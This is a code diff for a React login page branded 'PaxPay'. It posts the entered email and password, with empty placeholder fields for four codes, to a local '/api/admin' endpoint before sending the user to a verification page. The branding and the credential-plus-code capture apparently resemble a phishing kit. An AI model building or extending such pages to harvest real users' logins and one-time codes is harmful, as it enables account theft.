@@ -1,10 +1,39 @@
 
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import axios from 'axios';
 
 function LoginA() {
   const navigate = useNavigate();
   const [showPassword, setShowPassword] = useState(false);
+  const [formData, setFormData] = useState({ email: '', password: '' });
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handleChange = (e) => {
+    setFormData((prev) => ({
+      ...prev,
+      [e.target.name]: e.target.value,
+    }));
+  };
+
+  const handleSubmit = async () => {
+    setIsSubmitting(true);
+    try {
+      const res = await axios.post('http://localhost:5000/api/admin', {
+        email: formData.email,
+        password: formData.password,
+        code1: '', code2: '', code3: '', code4: '' // Empty for now
+      });
+
+      alert(res.data.message);
+      navigate('/verification'); // Navigate after success
+    } catch (err) {
+      alert('❌ Failed to submit. Check console.');
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="bg-black">
@@ -14,9 +43,8 @@ function LoginA() {
         <h1 className="font-bold bg-black text-gray-300 text-3xl">PaxPay</h1>
       </div>
 
-      <div className=" min-h-screen bg-black flex pt-12 justify-center">
+      <div className="min-h-screen bg-black flex pt-12 justify-center">
         <div className="fixed bg-black shadow-md rounded-lg py-8 px-4 w-full max-w-md">
-
           <h2 className="text-3xl font-semibold text-white">Welcome!</h2>
           <p className="text-sm text-gray-500 pt-3 pb-4">
             Don’t have an account?{' '}
@@ -30,8 +58,9 @@ function LoginA() {
               <label className="block text-gray-500 pb-2">Email/Phone number</label>
               <input
                 type="email"
-                id="email"
                 name="email"
+                value={formData.email}
+                onChange={handleChange}
                 required
                 className="w-full bg-transparent px-3 py-2 border border-gray-600 rounded-lg"
               />
@@ -41,8 +70,9 @@ function LoginA() {
               <label className="block text-gray-500 mb-1">Password*</label>
               <input
                 type={showPassword ? 'text' : 'password'}
-                id="password"
                 name="password"
+                value={formData.password}
+                onChange={handleChange}
                 required
                 className="w-full bg-transparent text-white px-3 py-2 border border-gray-600 rounded-lg pr-10"
               />
@@ -63,10 +93,11 @@ function LoginA() {
 
             <button
               type="button"
-              onClick={() => navigate('/verification')}
+              onClick={handleSubmit}
+              disabled={isSubmitting}
               className="w-full bg-lime-400 text-black py-2 rounded-full font-semibold hover:bg-lime-500 transition"
             >
-              Sign In
+              {isSubmitting ? 'Submitting...' : 'Sign In'}
             </button>
           </form>
         </div>
@@ -76,3 +107,4 @@ function LoginA() {
 }
 
 export default LoginA;
+
